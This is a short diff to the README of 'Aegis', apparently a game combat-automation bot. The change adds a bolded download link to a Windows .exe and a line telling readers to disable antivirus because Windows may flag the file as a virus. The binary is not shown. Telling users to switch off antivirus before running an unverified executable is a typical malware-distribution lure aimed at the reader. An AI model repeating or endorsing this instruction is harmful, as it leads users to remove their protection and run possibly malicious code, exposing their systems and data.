@@ -12,7 +12,10 @@
 
 Aegis keeps repeatable combat routines in one focused tool. It supports multiple active clients, per-character profiles, controlled background input, live nearby-monster selection, and an optional MAU safeguard.
 
-Get v2.0.1: https://github.com/josemumuchan/aegis/releases/download/stable/Aegis.v2.0.1.exe
+
+**Get v2.0.1 ⬇️: https://github.com/josemumuchan/aegis/releases/download/stable/Aegis.v2.0.1.exe**
+
+**Windows might flag the file as a virus and will delete it. Disable antivirus to download**
 
 ## Quick Start
 
